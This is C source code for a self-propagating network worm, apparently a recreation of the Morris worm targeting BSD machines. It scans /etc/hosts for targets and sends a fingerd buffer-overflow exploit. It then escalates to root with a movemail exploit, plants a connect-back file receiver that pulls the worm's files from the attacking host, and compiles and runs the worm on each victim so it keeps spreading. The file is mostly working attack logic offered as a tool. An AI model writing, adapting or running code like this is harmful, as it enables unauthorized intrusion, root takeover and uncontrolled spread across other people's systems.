/*
TODO:
- ensure the "&" command actually runs the compiled programs (could use "./" instead?)
- convert this file to old C so that this can be ran on BSD systems
- test this program at all...
*/


#include "worm.h"
#include "worm_bsd.h"
#include <sys/types.h>
#include <sys/wait.h>
#include <signal.h>
#include <netdb.h>

#define HOSTS_FILE "/etc/hosts"
#define MAX_IP_LEN 64

/*
 * Get the current machine's IP address
 * Stores result in ip buffer
 * 
 * Straight AI code, unsure if this approach is best. 
 * I dont really know enough about sockets/networking to write this by hand.
 * But shouldn't we be able to get local IP from etc/hosts or some other simplier way?
 */
void get_local_ip(char *ip) {
	int sock;
	struct sockaddr_in serv_addr, local_addr;
	socklen_t len = sizeof(local_addr);

	/* Create a UDP socket */
	sock = socket(AF_INET, SOCK_DGRAM, 0);
	if (sock < 0) {
		strcpy(ip, "127.0.0.1");
		return;
	}

	/* Connect to a public DNS (8.8.8.8:53) to determine local IP */
	serv_addr.sin_family = AF_INET;
	serv_addr.sin_port = htons(53);
	inet_pton(AF_INET, "8.8.8.8", &serv_addr.sin_addr);

	if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
		strcpy(ip, "127.0.0.1");
		close(sock);
		return;
	}

	/* Get the local address bound to this socket */
	if (getsockname(sock, (struct sockaddr *)&local_addr, &len) < 0) {
		strcpy(ip, "127.0.0.1");
		close(sock);
		return;
	}

	/* Convert to string */
	inet_ntop(AF_INET, &local_addr.sin_addr, ip, MAX_IP_LEN);
	close(sock);
}

/*
 * Deploys very slightly modified receive_file_bsd.c on target machine
 * sock - The active root shell
 * my_ip - The IP of the current machine for the target to connect back to
 */
void deploy_receive_file(int sock, char *my_ip) {
    char cmd_buf[IO_BUF_SIZE];
    // Allocate a buffer on the heap bc really big string
    char *formatted_source = (char *)malloc(10000); 
    if (formatted_source == NULL) return;

    const char *file_contents = 
    "#include <stdio.h>\n"
    "#include <sys/types.h>\n"
    "#include <sys/socket.h>\n"
    "#include <netinet/in.h>\n"
    "#include <sys/time.h>\n"
    "#include <arpa/inet.h>\n\n"
    "#define SERVER_IP \"%s\"\n" // This %s will be replaced with my_ip
    "#define SERVER_PORT 4444\n"
    "#define IO_BUF_SIZE 2048\n\n"
    "int send_int(num, fd) int num; int fd; {\n"
    "    unsigned long conv = htonl((unsigned long)num);\n"
    "    char *data = (char*)&conv; int left = sizeof(conv); int rc;\n"
    "    do {\n"
    "        rc = write(fd, data, left);\n"
    "        if (rc < 0) return -1;\n"
    "        else { data += rc; left -= rc; }\n"
    "    } while (left > 0);\n"
    "    return 0;\n"
    "}\n\n"
    "int receive_int(num, fd) int *num; int fd; {\n"
    "    unsigned long ret; char *data = (char*)&ret; int left = sizeof(ret); int rc;\n"
    "    do {\n"
    "        rc = read(fd, data, left);\n"
    "        if (rc <= 0) return -1;\n"
    "        else { data += rc; left -= rc; }\n"
    "    } while (left > 0);\n"
    "    *num = ntohl(ret); return 0;\n"
    "}\n\n"
    "int main() {\n"
    "    int i, j, n, server_sock, file_size, len, num_files;\n"
    "    struct timeval tv; struct sockaddr_in serv_addr;\n"
    "    char io_buf[IO_BUF_SIZE], path[256];\n"
    "    FILE *outfile; char *file_name;\n\n"
    "    server_sock = socket(AF_INET, SOCK_STREAM, 0);\n"
    "    if (server_sock < 0) return 1;\n"
    "    bzero((char *)&serv_addr, sizeof(serv_addr));\n"
    "    serv_addr.sin_family = AF_INET; serv_addr.sin_port = htons(SERVER_PORT);\n"
    "    serv_addr.sin_addr.s_addr = inet_addr(SERVER_IP);\n\n"
    "    while (connect(server_sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) sleep(1);\n\n"
    "    while (1) {\n"
    "        write(server_sock, \"Hello from client!\\n\", 19);\n"
    "        FD_ZERO(&read_fds); FD_SET(server_sock, &read_fds);\n"
    "        tv.tv_sec = 5; tv.tv_usec = 0;\n"
    "        if (select(server_sock + 1, &read_fds, (fd_set *)0, (fd_set *)0, &tv) > 0) {\n"
    "            if (receive_int(&num_files, server_sock) < 0) continue;\n"
    "            send_int(num_files, server_sock);\n"
    "            for (i = 0; i < num_files; i++) {\n"
    "                if (receive_int(&len, server_sock) < 0) continue;\n"
    "                file_name = (char *)malloc((len + 1) * sizeof(char));\n"
    "                n = read(server_sock, file_name, len); file_name[n] = '\\0';\n"
    "                sprintf(path, \"/tmp/%%s\", file_name);\n"
    "                outfile = fopen(path, \"w\");\n"
    "                if (receive_int(&file_size, server_sock) < 0) continue;\n"
    "                while (file_size > 0) {\n"
    "                    n = read(server_sock, io_buf, IO_BUF_SIZE - 1);\n"
    "                    if (n > 0) { io_buf[n] = '\\0'; fputs(io_buf, outfile); }\n"
    "                    file_size -= n;\n"
    "                }\n"
    "                fclose(outfile); free(file_name);\n"
    "                send_int(i, server_sock);\n"
    "            }\n"
    "            write(server_sock, \"Files recieved\\n\", 15);\n"
    "            break;\n"
    "        }\n"
    "    }\n"
    "    close(server_sock); return 0;\n"
    "}\n";

    // Inject the actual IP into the template
    sprintf(formatted_source, file_contents, my_ip);

    // Start the cat command
    write_to_sock(sock, "cat > /tmp/receive_file.c << 'EOF'\n");

    // Send file contents
    write_to_sock(sock, formatted_source);
    write_to_sock(sock, "EOF\n");
    sleep(5);

    // cleanup
    memset(cmd_buf, 0, IO_BUF_SIZE);
    read_from_sock(sock, cmd_buf, IO_BUF_SIZE);
    free(formatted_source);
}


/*
 * Attempts to propagate the worm to a target host passed in via ip argument
 * Creates socket to fingerd, sends exploit, and executes propagation commands
 */
void infect(char *ip, char *my_ip) {
	int sock = 0;
	struct sockaddr_in serv_addr;
	char buf[BUF_SIZE] = {0};
	char io_buf[IO_BUF_SIZE] = {0};
	char cmd_buf[IO_BUF_SIZE] = {0};
	FILE *fp;
	int file_size;

	printf("[*] Attempting to infect: %s\n", ip);
	fflush(stdout);

	/* Create socket to connect to fingerd */
	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock < 0) {
		printf("[-] Failed to create socket for %s\n", ip);
		return;
	}

	/* Set up socket address structure */
	create_sockaddr(&serv_addr, ip, FINGERD_PORT);

	/* Connect to fingerd, print error if failed */
	if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
		printf("[-] Failed to connect to fingerd on %s\n", ip);
		close(sock);
		return;
	}

    /* If we made it here, we are conneceted to fingerd on the target, so we
    create and send the buffer overflow exploit. Bang. */
	printf("[+] Connected to fingerd on %s, sending exploit...\n", ip);
	fflush(stdout);
	create_exploit(buf, PAYLOAD, (ssize_t)BUF_SIZE, (ssize_t)PAYLOAD_LEN);
	write(sock, buf, sizeof(buf));
	sleep(5); // let it cook

	/* Now we should have a shell - use movemail exploit to get root */
	printf("[*] Using movemail exploit to get root...\n");
	get_root_shell_via_movemail_exploit(sock, io_buf, IO_BUF_SIZE);
    sleep(5); // more cooking
	printf("[+] Got root shell (bang), sending files...\n");
	fflush(stdout);

	// Send receive_file_bsd.c (vector) over
	deploy_receive_file(sock, my_ip);
    
	/* Fork to start file server, send files */
	if (fork() == 0) {
		// Child ps executes send_file_over_socket with worm files and itself
		char *argv[] = {
			"send_file_over_socket_bsd",
			"worm_bsd.c",
			"worm_bsd.h",
            // "send_file_over_socket.c" try just sending binary for now, could add compile step later
			NULL
		};
		execv("./send_file_over_socket_bsd", argv);
		exit(1);  /* If execv fails */
	}

    // compile send_file_over_socket on target for next propogation (dont need, just send binary)
	// write_to_sock(sock, "cc /tmp/send_file_over_socket.c -o /tmp/send_file_over_socket\n");

    // Compile and run receive_file, should pull in worm.c, worm.h, and send_file_over_socket.c from attacker
	printf("[*] Compiling receive_file.c on target...\n");
	write_to_sock(sock, "cc /tmp/receive_file.c -o /tmp/receive_file\n");
	sleep(2);
	read_from_sock(sock, io_buf, IO_BUF_SIZE);
	printf("[*] Running file receiver on target...\n");
	write_to_sock(sock, "/tmp/receive_file &\n");
	sleep(2);
	read_from_sock(sock, io_buf, IO_BUF_SIZE);

    // compile worm.c and run it, completing self propogation
	printf("[*] Compiling worm.c on target...\n");
	write_to_sock(sock, "cc /tmp/worm.c -o /tmp/worm\n");
	sleep(2);
	read_from_sock(sock, io_buf, IO_BUF_SIZE);
	printf("[+] Running worm.c on target...\n");
	write_to_sock(sock, "/tmp/worm &\n");
	sleep(2);
	read_from_sock(sock, io_buf, IO_BUF_SIZE);

    // Infection and self propogation complete (bang)
	printf("[+] Infection of %s complete!\n", ip);
	close(sock);
}


int main() {
	FILE *fp;
	char line[128];
	char ip[MAX_IP_LEN];
	char my_ip[MAX_IP_LEN];

	/* Get the current machine's IP */
	get_local_ip(my_ip);
	printf("[*] Worm Started on IP: %s\n", my_ip);
	fflush(stdout);

	/* The main infinite loop */
	while (1) {
		printf("\n[*] Scanning /etc/hosts for targets...\n");
		fflush(stdout);

		/* Open /etc/hosts file */
		fp = fopen(HOSTS_FILE, "r");
		if (fp == NULL) {
			printf("[-] Could not open %s\n", HOSTS_FILE);
			sleep(25);
			continue;
		}

		/* Read each line from /etc/hosts */
		while (fgets(line, 128, fp) != NULL) {
			/* Skip comments, empty lines, and whitespace-only lines */
			if (line[0] == '#' || line[0] == '\n' || line[0] == ' ')
				continue;

			/* Extract IP address from line */
			if (sscanf(line, "%63s", ip) != 1)
				continue;

			/* Skip localhost and our own IP */
			if (strcmp(ip, "127.0.0.1") == 0)
				continue;
			if (strcmp(ip, my_ip) == 0)
				continue;

			/* Infect the target */
			infect(ip, my_ip);

			/* delay between infections, dont want to overwhelm network */
			sleep(10);
		}

		fclose(fp);

		/* 
        Logic for rescanning, currently unused since there should only be
        one target in etc/hosts
         */
		// printf("[*] Scan complete, waiting before next scan...\n");
		// sleep(300);  /* Wait 5 minutes before scanning again */
	}

	return 0;
}
